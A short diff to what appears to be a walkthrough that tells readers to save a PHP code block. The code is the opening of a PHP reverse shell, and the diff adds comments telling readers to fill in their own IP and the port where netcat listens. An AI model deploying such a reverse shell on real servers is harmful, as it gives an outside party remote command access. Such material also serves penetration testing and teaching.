@@ -9,8 +9,8 @@ Copy the PHP code block below into new file and save it.
 <?php
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = 'YOUR_IP';
-$port = PORT;
+$ip = 'YOUR_IP'; //Replace with your real IP
+$port = PORT; //Replace with the port running netcat
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
